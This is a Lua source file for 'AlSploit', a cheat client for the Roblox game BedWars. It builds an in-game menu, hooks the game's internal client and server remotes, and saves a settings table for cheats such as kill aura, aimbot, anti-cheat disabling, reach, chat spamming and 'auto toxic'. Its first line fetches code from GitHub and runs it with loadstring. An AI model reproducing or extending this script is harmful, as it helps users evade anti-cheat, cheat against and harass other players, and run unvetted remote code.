local WhitelistedUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/main/Whitelist"))()
local Owner = "AlSploitRevamped"

local LocalPlayer = game.Players.LocalPlayer

local CollectionService = game:GetService("CollectionService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LightingService = game:GetService("Lighting")
local PlayerService = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local WorkSpace = game:GetService("Workspace") or game.Workspace or workspace
local CoreGui = game:GetService("CoreGui")

local AlSploit = Instance.new("ScreenGui")
local ContainerFrame = Instance.new("Frame")
local ContainerFrameUIListLayout = Instance.new("UIListLayout")
local NotificationContainer = Instance.new("Frame")
local NotificationContainerUIListLayout = Instance.new("UIListLayout")

local DefaultLayoutOrder = 0

AlSploit.Name = "AlSploit"
AlSploit.Parent = LocalPlayer:WaitForChild("PlayerGui")
AlSploit.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
AlSploit.ResetOnSpawn = false

ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = AlSploit
ContainerFrame.BackgroundColor3 = Color3.new(255, 255, 255)
ContainerFrame.BackgroundTransparency = 1.000
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 0, 0, 0)
ContainerFrame.Size = UDim2.new(1, 0, 1, 0)
ContainerFrame.Visible = false

ContainerFrameUIListLayout.Parent = ContainerFrame
ContainerFrameUIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
ContainerFrameUIListLayout.Padding = UDim.new(0, 50)
ContainerFrameUIListLayout.FillDirection = Enum.FillDirection.Horizontal
ContainerFrameUIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

NotificationContainer.Name = "NotificationContainer"
NotificationContainer.Parent = AlSploit
NotificationContainer.BackgroundColor3 = Color3.new(255, 255, 255)
NotificationContainer.BackgroundTransparency = 1.000
NotificationContainer.BorderColor3 = Color3.new(0, 0, 0)
NotificationContainer.BorderSizePixel = 0
NotificationContainer.Position = UDim2.new(0.842737675, 0, 0, 0)
NotificationContainer.Size = UDim2.new(0.157002911, 0, 0.980487823, 0)

NotificationContainerUIListLayout.Parent = NotificationContainer
NotificationContainerUIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
NotificationContainerUIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
NotificationContainerUIListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
NotificationContainerUIListLayout.Padding = UDim.new(0, 10)

local UIAspectRatioConstraintOpen = Instance.new("UIAspectRatioConstraint")
local UIStroke = Instance.new("UIStroke")
local UICorner = Instance.new("UICorner")
local Open = Instance.new("ImageButton")

UIStroke.Parent = Open
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Thickness = 2
UIStroke.Color = Color3.new(0.635294, 0.313725, 1)

Open.Name = "Open"
Open.Parent = AlSploit
Open.BackgroundColor3 = Color3.new(255, 255, 255)
Open.BorderColor3 = Color3.new(0, 0, 0)
Open.BorderSizePixel = 0
Open.Position = UDim2.new(0.963096738, 0, 0.351765305, 0)
Open.Size = UDim2.new(0.0329854637, 0, 0.0837961882, 0)
Open.Image = "rbxassetid://15428841655"

UICorner.CornerRadius = UDim.new(0, 6)
UICorner.Parent = Open

UIAspectRatioConstraintOpen.Parent = Open
UIAspectRatioConstraintOpen.AspectRatio = 1

local Blur = Instance.new("BlurEffect")

Blur.Parent = LightingService
Blur.Enabled = false
Blur.Size = 16

task.spawn(function()
	Open.Activated:Connect(function()
		ContainerFrame.Visible = not ContainerFrame.Visible
		Blur.Enabled = not Blur.Enabled
	end)
end)

local function CreateTab(Name)
	local Tab = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local CornerFix = Instance.new("Frame")
	local ModulesContainer = Instance.new("Frame")	
	local UIListLayout = Instance.new("UIListLayout")	
	local Title = Instance.new("TextLabel")
	local UIGradient = Instance.new("UIGradient")

	Tab.Name = "Tab"
	Tab.Parent = ContainerFrame
	Tab.BackgroundColor3 = Color3.new(0, 0, 0)
	Tab.BorderColor3 = Color3.new(0, 0, 0)
	Tab.BorderSizePixel = 0
	Tab.Position = UDim2.new(0.434123844, 0, 0, 0)
	Tab.Size = UDim2.new(0.142, 0, 0.049, 0)

	UICorner.CornerRadius = UDim.new(0, 12)
	UICorner.Parent = Tab

	CornerFix.Name = "CornerFix"
	CornerFix.Parent = Tab
	CornerFix.BackgroundColor3 = Color3.new(0, 0, 0)
	CornerFix.BorderColor3 = Color3.new(0, 0, 0)
	CornerFix.BorderSizePixel = 0
	CornerFix.Position = UDim2.new(0, 0, 0.371, 0)
	CornerFix.Size = UDim2.new(1, 0, 0.629, 0)

	ModulesContainer.Name = "ModulesContainer"
	ModulesContainer.Parent = Tab
	ModulesContainer.BackgroundColor3 = Color3.new(255, 255, 255)
	ModulesContainer.BackgroundTransparency = 1.000
	ModulesContainer.BorderColor3 = Color3.new(0, 0, 0)
	ModulesContainer.BorderSizePixel = 0
	ModulesContainer.Position = UDim2.new(0, 0, 1, 0)
	ModulesContainer.Size = UDim2.new(1, 0, 21.4285717, 0)

	UIListLayout.Parent = ModulesContainer
	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout.FillDirection = Enum.FillDirection.Vertical
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder	

	Title.Name = "Title"
	Title.Parent = Tab
	Title.BackgroundColor3 = Color3.new(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.BorderColor3 = Color3.new(0, 0, 0)
	Title.BorderSizePixel = 0
	Title.Position = UDim2.new(0, 0, 0.123508625, 0)
	Title.Size = UDim2.new(0.99999994, 0, 0.742857158, 0)
	Title.Font = Enum.Font.GothamBold
	Title.Text = Name
	Title.TextColor3 = Color3.new(255, 255, 255)
	Title.TextSize = 17
	Title.TextWrapped = true

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.843137, 0.686275, 1))}
	UIGradient.Rotation = 90
	UIGradient.Parent = Title

	return ModulesContainer
end

local function CreateToggle(Parent, Name, DefaultValue, CallBack)
	local Toggle = Instance.new("TextButton")
	local UIPadding = Instance.new("UIPadding")
	local UIGradient = Instance.new("UIGradient")
	local DropDownButton = Instance.new("ImageButton")

	local CallBackValue = DefaultValue

	local LayoutOrder = 0

	local function CallBackToggle(Value)		
		task.spawn(function()
			if Value == true then
				CallBackValue = true
				UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}

				CallBack(true)
			end
		end)

		task.spawn(function()
			if Value == false then
				CallBackValue = false
				UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}

				CallBack(false)
			end
		end)
	end

	Toggle.Name = "Toggle"
	Toggle.Parent = Parent
	Toggle.BackgroundColor3 = Color3.new(0, 0, 0)
	Toggle.BackgroundTransparency = 0.150
	Toggle.BorderColor3 = Color3.new(0, 0, 0)
	Toggle.BorderSizePixel = 0
	Toggle.Size = UDim2.new(1, 0, 0.0469164699, 0)
	Toggle.AutoButtonColor = false
	Toggle.Font = Enum.Font.GothamBold
	Toggle.Text = Name
	Toggle.TextColor3 = Color3.new(255, 255, 255)
	Toggle.TextSize = 12.000
	Toggle.TextXAlignment = Enum.TextXAlignment.Left
	Toggle.LayoutOrder = DefaultLayoutOrder + 5

	LayoutOrder = Toggle.LayoutOrder
	DefaultLayoutOrder = LayoutOrder

	UIPadding.Parent = Toggle
	UIPadding.PaddingLeft = UDim.new(0, 15)

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
	UIGradient.Rotation = 90
	UIGradient.Parent = Toggle

	DropDownButton.Name = "DropDownButton"
	DropDownButton.Parent = Toggle
	DropDownButton.BackgroundColor3 = Color3.new(255, 255, 255)
	DropDownButton.BackgroundTransparency = 1.000
	DropDownButton.BorderColor3 = Color3.new(0, 0, 0)
	DropDownButton.BorderSizePixel = 0
	DropDownButton.Position = UDim2.new(0.835, 0, 0.163, 0)
	DropDownButton.Rotation = 90.000
	DropDownButton.Size = UDim2.new(0.132, 0, 0.668, 0)
	DropDownButton.Image = "http://www.roblox.com/asset/?id=12809025337"

	CallBackToggle(CallBackValue)

	task.spawn(function()
		Toggle.Activated:Connect(function()
			CallBackToggle(not CallBackValue)
		end)
	end)

	return Toggle, DropDownButton, LayoutOrder, UIGradient
end

local function CreateKeyBind(Parent, DefaultValue, LayoutOrder, CallBack)
	local KeyBind = Instance.new("TextButton")
	local UIGradient = Instance.new("UIGradient")

	local function CallBackToggle(Value)
		CallBack(Value)
	end

	KeyBind.Name = "KeyBind"
	KeyBind.Parent = Parent
	KeyBind.BackgroundColor3 = Color3.new(0, 0, 0)
	KeyBind.BackgroundTransparency = 0.150
	KeyBind.BorderColor3 = Color3.new(0, 0, 0)
	KeyBind.BorderSizePixel = 0
	KeyBind.Position = UDim2.new(0, 0, 0.0765417367, 0)
	KeyBind.Size = UDim2.new(0.99999994, 0, 0.0353890099, 0)
	KeyBind.AutoButtonColor = false
	KeyBind.Font = Enum.Font.GothamBold
	KeyBind.Text = "KeyBind: " .. DefaultValue
	KeyBind.TextColor3 = Color3.new(255, 255, 255)
	KeyBind.TextSize = 11.000
	KeyBind.LayoutOrder = LayoutOrder

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
	UIGradient.Rotation = 90
	UIGradient.Parent = KeyBind

	task.spawn(function()
		local InputValue = false
		local Value = false

		KeyBind.Activated:Connect(function()
			if Value == false then
				InputValue = true	
				KeyBind.Text = "..."
			end

			if Value == true and InputValue == true then
				KeyBind.Text = "KeyBind: " .. "..."
				InputValue = false
				CallBackToggle("...")
			end

			Value = not Value
		end)

		task.spawn(function()
			UserInputService.InputBegan:Connect(function(Input)
				if InputValue == true and not UserInputService:GetFocusedTextBox() then
					if Input.KeyCode and Input.UserInputType == Enum.UserInputType.Keyboard then
						KeyBind.Text = "KeyBind: " .. Input.KeyCode.Name

						CallBackToggle(Input.KeyCode.Name)
						InputValue = false
					end
				end
			end)
		end)
	end)

	return KeyBind
end

local function CreateMiniToggle(Parent, Name, DefaultValue, LayoutOrder, CallBack)
	local MiniToggle = Instance.new("TextButton")
	local UIGradient = Instance.new("UIGradient")

	local CallBackValue = DefaultValue


	local function CallBackToggle(Value)		
		task.spawn(function()
			if Value == true then
				CallBackValue = true
				UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}

				CallBack(true)
			end
		end)

		task.spawn(function()
			if Value == false then
				CallBackValue = false
				UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}

				CallBack(false)
			end
		end)
	end

	MiniToggle.Name = "MiniToggle"
	MiniToggle.Parent = Parent
	MiniToggle.BackgroundColor3 = Color3.new(0, 0, 0)
	MiniToggle.BackgroundTransparency = 0.150
	MiniToggle.BorderColor3 = Color3.new(0, 0, 0)
	MiniToggle.BorderSizePixel = 0
	MiniToggle.Position = UDim2.new(0, 0, 0.0765417367, 0)
	MiniToggle.Size = UDim2.new(0.99999994, 0, 0.0353890099, 0)
	MiniToggle.AutoButtonColor = false
	MiniToggle.Font = Enum.Font.GothamBold
	MiniToggle.Text = Name
	MiniToggle.TextColor3 = Color3.new(255, 255, 255)
	MiniToggle.TextSize = 11.000
	MiniToggle.LayoutOrder = LayoutOrder

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
	UIGradient.Rotation = 90
	UIGradient.Parent = MiniToggle

	CallBackToggle(CallBackValue)

	task.spawn(function()
		MiniToggle.Activated:Connect(function()
			CallBackToggle(not CallBackValue)
		end)
	end)

	return MiniToggle
end

local function CreateSlider(Parent, Name, DefaultValue, MaximumValue, LayoutOrder, CallBack)
	local Slider = Instance.new("Frame")
	local SliderFrame = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local Bar = Instance.new("TextButton")
	local UICorner_2 = Instance.new("UICorner")
	local UIGradient = Instance.new("UIGradient")
	local UIStroke = Instance.new("UIStroke")

	local Title = Instance.new("TextLabel")
	local UIGradient_2 = Instance.new("UIGradient")
	local Fill = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")
	local UIGradient_3 = Instance.new("UIGradient")

	Slider.Name = "Slider"
	Slider.Parent =  Parent
	Slider.BackgroundColor3 = Color3.new(0, 0, 0)
	Slider.BackgroundTransparency = 0.150
	Slider.BorderColor3 = Color3.new(0, 0, 0)
	Slider.BorderSizePixel = 0
	Slider.Position = UDim2.new(0, 0, 0.116778016, 0)
	Slider.Size = UDim2.new(0.99999994, 0, 0.0687298849, 0)
	Slider.LayoutOrder = LayoutOrder

	SliderFrame.Name = "SliderFrame"
	SliderFrame.Parent = Slider
	SliderFrame.BackgroundColor3 = Color3.new(255, 255, 255)
	SliderFrame.BackgroundTransparency = 1.000
	SliderFrame.BorderColor3 = Color3.new(0, 0, 0)
	SliderFrame.BorderSizePixel = 0
	SliderFrame.Position = UDim2.new(0.150000006, 0, 0.581818163, 0)
	SliderFrame.Size = UDim2.new(0.699999988, 0, 0.145454541, 0)

	UICorner.CornerRadius = UDim.new(0, 12)
	UICorner.Parent = SliderFrame

	Bar.Name = "Bar"
	Bar.Parent = SliderFrame
	Bar.BackgroundColor3 = Color3.new(255, 255, 255)
	Bar.BorderColor3 = Color3.new(0, 0, 0)
	Bar.BorderSizePixel = 0
	Bar.Position = UDim2.new(0.142857149, 0, -1.36341882, 0)
	Bar.Size = UDim2.new(0.0571428575, 0, 3.5, 0)
	Bar.ZIndex = 2
	Bar.AutoButtonColor = false
	Bar.Font = Enum.Font.SourceSans
	Bar.Text = ""
	Bar.TextColor3 = Color3.new(0, 0, 0)
	Bar.TextSize = 14.000

	UICorner_2.CornerRadius = UDim.new(0, 12)
	UICorner_2.Parent = Bar

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
	UIGradient.Parent = Bar

	UIStroke.Parent = Bar
	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 2
	UIStroke.Color = Color3.new(0, 0, 0)

	Title.Name = "Title"
	Title.Parent = SliderFrame
	Title.BackgroundColor3 = Color3.new(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.BorderColor3 = Color3.new(0, 0, 0)
	Title.BorderSizePixel = 0
	Title.Position = UDim2.new(0.321428567, 0, -3.7615819, 0)
	Title.Size = UDim2.new(0.357142866, 0, 2.5, 0)
	Title.Font = Enum.Font.GothamBold
	Title.Text = Name .. ": " .. DefaultValue
	Title.TextColor3 = Color3.new(255, 255, 255)
	Title.TextSize = 11.00

	UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
	UIGradient_2.Rotation = 90
	UIGradient_2.Parent = Title

	Fill.Name = "Fill"
	Fill.Parent = SliderFrame
	Fill.BackgroundColor3 = Color3.new(255, 255, 255)
	Fill.BorderColor3 = Color3.new(0, 0, 0)
	Fill.BorderSizePixel = 0
	Fill.Size = UDim2.new(1, 0, 1, 0)

	UICorner_3.CornerRadius = UDim.new(0, 12)
	UICorner_3.Parent = Fill

	UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
	UIGradient_3.Parent = Fill

	local Debounce = true

	local function Snap(Number, Factor)
		if Factor == 0 then
			return Number
		else
			return math.floor(Number / Factor + 0.5) * Factor
		end
	end

	task.spawn(function()
		Bar.MouseButton1Down:Connect(function()
			Debounce = false
		end)

		UserInputService.InputEnded:connect(function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseButton1 then
				Debounce = true
			end
		end)
	end)

	task.spawn(function()
		local BarPosition = Bar.Position

		local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
		local PositionTween = TweenService:Create(Bar, TweenInformation, {Position = UDim2.new(DefaultValue / MaximumValue - 0.05, 0, BarPosition.Y.Scale, BarPosition.Y.Offset)})

		PositionTween:Play()

		local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
		local SizeTween = TweenService:Create(Fill, TweenInformation, {Size = UDim2.new(DefaultValue / MaximumValue, 0, 1, 0)})

		SizeTween:Play()
	end)

	task.spawn(function()
		repeat
			task.wait()

			if Debounce == false then
				local MousePosition = UserInputService:GetMouseLocation().X
				local BarPosition = Bar.Position
				local FrameSize = Slider.AbsoluteSize.X
				local FramePosition = Slider.AbsolutePosition.X

				local Position = Snap((MousePosition - FramePosition) / FrameSize, 0.01)

				local Percentage = math.clamp(Position, 0, 1)

				local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
				local PositionTween = TweenService:Create(Bar, TweenInformation, {Position = UDim2.new(Percentage, 0, BarPosition.Y.Scale, BarPosition.Y.Offset)})

				PositionTween:Play()

				local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
				local SizeTween = TweenService:Create(Fill, TweenInformation, {Size = UDim2.new(Percentage, 0, 1, 0)})

				SizeTween:Play()

				Title.Text = Name .. ": " .. math.round(Percentage * MaximumValue)

				CallBack(math.round(Percentage * MaximumValue))
			end
		until not Slider
	end)

	return Slider
end

local function CreateNotification(Duration, Message)
	local Notification = Instance.new("Frame")
	local UIStroke = Instance.new("UIStroke")
	local UIGradient = Instance.new("UIGradient")
	local UICorner = Instance.new("UICorner")
	local Text = Instance.new("TextLabel")

	Notification.Name = "Notification"
	Notification.Parent = NotificationContainer
	Notification.BackgroundColor3 = Color3.new(0, 0, 0)
	Notification.BackgroundTransparency = 0.150
	Notification.BorderColor3 = Color3.new(0, 0, 0)
	Notification.BorderSizePixel = 0
	Notification.Position = UDim2.new(0.226286799, 0, 0, 0)
	Notification.Size = UDim2.new(0, 0, 0, 0)

	UIStroke.Parent = Notification
	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 2
	UIStroke.Color = Color3.new(1, 1, 1)

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
	UIGradient.Parent = UIStroke

	UICorner.Parent = Notification
	UICorner.CornerRadius = UDim.new(0, 6)

	Text.Name = "Text"
	Text.Parent = Notification
	Text.BackgroundColor3 = Color3.new(255, 255, 255)
	Text.BackgroundTransparency = 1.000
	Text.BorderColor3 = Color3.new(0, 0, 0)
	Text.BorderSizePixel = 0
	Text.Position = UDim2.new(-0.00263573672, 0, 0, 0)
	Text.Size = UDim2.new(0.999999881, 0, 1.0000006, 0)
	Text.Font = Enum.Font.GothamBold
	Text.Text = Message
	Text.TextColor3 = Color3.new(255, 255, 255)
	Text.TextSize = 10.00

	task.spawn(function()
		local NotificationSize = UDim2.new(1, 0, 0.087, 0)

		local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
		local SizeTween = TweenService:Create(Notification, TweenInformation, {Size = NotificationSize})

		SizeTween:Play()

		task.wait(Duration)

		NotificationSize = UDim2.new(0, 0, 0, 0)

		local SizeTween2 = TweenService:Create(Notification, TweenInformation, {Size = NotificationSize})

		SizeTween2:Play()

		task.spawn(function()
			task.wait(TweenInformation.Time)

			Notification:Destroy()
		end)
	end)
end

local function CreateFlyHud()
	local Background = Instance.new("Frame")
	local UIStroke = Instance.new("UIStroke")
	local UICorner = Instance.new("UICorner")
	local Text = Instance.new("TextLabel")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
	local DisplayBackground = Instance.new("Frame")
	local UICorner_2 = Instance.new("UICorner")
	local Display = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")

	Background.Name = "Background"
	Background.Parent = AlSploit
	Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Background.BackgroundTransparency = 0.250
	Background.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Background.BorderSizePixel = 0
	Background.Position = UDim2.new(0.41, 0, 0.7, 0)
	Background.Size = UDim2.new(0.178, 0, 0.085, 0)

	UIStroke.Parent = Background
	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 2
	
	
	task.spawn(function()
		repeat
			task.wait(0.001)

			UIStroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
		until not game
	end)
	
	UICorner.Parent = Background

	Text.Name = "Text"
	Text.Parent = Background
	Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Text.BackgroundTransparency = 1.000
	Text.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Text.BorderSizePixel = 0
	Text.Position = UDim2.new(-0.00332811219, 0, 0.510591209, 0)
	Text.Size = UDim2.new(0.999999762, 0, 0.489407092, 0)
	Text.Font = Enum.Font.GothamBold
	Text.Text = "1"
	Text.TextColor3 = Color3.fromRGB(175, 105, 255)
	Text.TextScaled = true
	Text.TextSize = 20.000
	Text.TextWrapped = true

	UITextSizeConstraint.Parent = Text
	UITextSizeConstraint.MaxTextSize = 20

	DisplayBackground.Name = "DisplayBackground"
	DisplayBackground.Parent = Background
	DisplayBackground.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	DisplayBackground.BorderColor3 = Color3.fromRGB(0, 0, 0)
	DisplayBackground.BorderSizePixel = 0
	DisplayBackground.Position = UDim2.new(0.228761196, 0, 0.266666889, 0)
	DisplayBackground.Size = UDim2.new(0.544929683, 0, 0.149570271, 0)

	UICorner_2.CornerRadius = UDim.new(0, 6)
	UICorner_2.Parent = DisplayBackground

	Display.Name = "Display"
	Display.Parent = DisplayBackground
	Display.BackgroundColor3 = Color3.fromRGB(175, 105, 255)
	Display.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Display.BorderSizePixel = 0
	Display.Position = UDim2.new(0, 0, 0, 0)
	Display.Size = UDim2.new(0, 0, 1, 0)
	Display.ZIndex = 2

	UICorner_3.CornerRadius = UDim.new(0, 6)
	UICorner_3.Parent = Display

	return Background, Text, Display
end

function CreateOutline(Player)
	if IsAlive(Player) then
		local BillBoard = Instance.new("BillboardGui")

		BillBoard.Size = UDim2.new(4, 0, 4, 0)
		BillBoard.AlwaysOnTop = true
		BillBoard.Name = "Esp"

		local Frame = Instance.new("Frame")

		Frame.Size = UDim2.new(1, 0, 1.5, 0)
		Frame.Position = UDim2.new(0, 0, -Player.Character.LowerTorso.Size.Y / 2 or -Player.PrimaryPart.Size.Y / 2, 0)
		Frame.BackgroundTransparency = 1

		local Stroke = Instance.new("UIStroke")

		Stroke.Thickness = 1.5
		Stroke.Color = Color3.new(0.635294, 0.313725, 1)
		Stroke.Transparency = 0

		local UICorner = Instance.new("UICorner")

		UICorner.Parent = Frame
		UICorner.CornerRadius = UDim.new(0, 3)

		Stroke.Parent = Frame
		Frame.Parent = BillBoard
		BillBoard.Parent = Player.Character.PrimaryPart
	end
end

local Settings = {}
local Loaded = false

local SaveFileName = "AlSploitConfigsSavingBedwars"

local function CreateSettingsFile()
	Settings = {
		NoPlacementCps = {Value = true, KeyBind = "..."},
		ChestStealer = {Value = true, Range = 30, KeyBind = "..."},
		InfiniteJump = {Value = true, KeyBind = "..."},
		AutoClicker = {Value = true, Cps = 30, KeyBind = "..."},
		NoKnockBack = {Value = true, KeyBind = "..."},	
		InfiniteFly = {Value = false, KeyBind = "..."},
		DamageBoost = {Value = true, KeyBind = "..."},
		ChatSpammer = {Value = false, Speed = 50, KeyBind = "..."},
		AcDisabler = {Value = true, KeyBind = "..."},
		FpsBooster = {Value = false, KeyBind = "..."},
		Indicators = {Value = true, KeyBind = "..."},
		AutoReport = {Value = true, KeyBind = "..."},
		AntiStaff = {Value = true, Kick = false, KeyBind = "..."},
		AutoToxic = {Value = false, KeyBind = "..."},
		GalaxySky = {Value = true, KeyBind = "..."},
		PlayAgain = {Value = true, KeyBind = "..."},
		Invisible = {Value = false, KeyBind = "..."},
		AimAssist = {Value = true, Range = 18, KeyBind = "..."},
		Scaffold = {Value = false, ExpandDistance = 2, KeyBind = "..."},
		KillAura = {Value = true, Range = 20, CustomAnimation = true, ToolCheck = false, KeyBind = "..."},
		AntiVoid = {Value = true, Transparency = 0.65, KeyBind = "..."},
		AutoBank = {Value = true, Range = 30, KeyBind = "..."},
		HighJump = {Value = false, KeyBind = "..."},
		PlayerTp = {Value = true, KeyBind = "..."},
		AutoKit = {Value = true, KeyBind = "..."},
		AutoBuy = {Value = true, KeyBind = "..."},
		Sprint = {Value = true, KeyBind = "..."},
		NoFall = {Value = true, KeyBind = "..."},
		Aimbot = {Value = true, KeyBind = "...", ToolCheck = false},
		Speed = {Value = true, Speed = 23, KeyBind = "..."},
		Reach = {Value = true, KeyBind = "..."},
		Nuker = {Value = true, Range = 30, BreakOres = true, KeyBind = "..."},
		BedTp = {Value = true, KeyBind = "..."},
		Cape = {Value = true, KeyBind = "..."},
		Fly = {Value = false, KeyBind = "..."},
		Esp = {Value = true, KeyBind = "..."},
		Fov = {Value = false, Fov = 100, KeyBind = "..."}
	}

	if not (writefile or makefolder or readfile or isfile) then
		CreateNotification(5, "Your executor does not support saving.")
	end

	if writefile and makefolder and readfile and isfile then 
		makefolder("AlSploitBedwarsConfigSaving")

		local JSONEncodeSettings = HttpService:JSONEncode(Settings)

		writefile("AlSploitBedwarsConfigSaving/" .. SaveFileName, JSONEncodeSettings)	
	end
end

local function CheckFirstTime()
	if isfile("AlSploitBedwarsConfigSaving/" .. SaveFileName) then
		return false
	end

	if not isfile("AlSploitBedwarsConfigSaving/" .. SaveFileName) then
		return true
	end
end

function SaveSettings()	
	local JSONEncodeSettings = HttpService:JSONEncode(Settings)

	writefile("AlSploitBedwarsConfigSaving/" .. SaveFileName, JSONEncodeSettings)	
end

function LoadSettings()
	if isfile("AlSploitBedwarsConfigSaving/" .. SaveFileName) then
		Settings = HttpService:JSONDecode(readfile("AlSploitBedwarsConfigSaving/" .. SaveFileName))

		Loaded = true
	end
end

task.spawn(function()
	local FirstTime = CheckFirstTime()

	if FirstTime == true then
		CreateSettingsFile()
	end
end)

task.spawn(function()
	LoadSettings()
end)

task.spawn(function()
	repeat
		task.wait(1)

		SaveSettings()
	until not game
end)

repeat task.wait() until Loaded == true

local Camera = WorkSpace.CurrentCamera
local OrigC0 = ReplicatedStorage.Assets.Viewmodel.RightHand.RightWrist.C0

local KnitClient = debug.getupvalue(require(LocalPlayer.PlayerScripts.TS.knit).setup, 6)
local Client = require(ReplicatedStorage.TS.remotes).default.Client

local HannahPromptTriggerRemote = Client:Get("HannahPromptTrigger")
local TrinitySetAngelTypeRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("SetAngelType")
local SetObservedChestRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("Inventory/SetObservedChest")
local ResetCharacterRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("ResetCharacter")
local ChestGiveItemRemote =  ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("Inventory/ChestGiveItem")
local ChestGetItemRemote =  ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("Inventory/ChestGetItem")
local PurchaseItemRemote = ReplicatedStorage.rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.BedwarsPurchaseItem
local BlockPlacingRemote =  ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@easy-games"):WaitForChild("block-engine"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("PlaceBlock")
local ClientHandlerStore = require(LocalPlayer.PlayerScripts.TS.ui.store).ClientStore
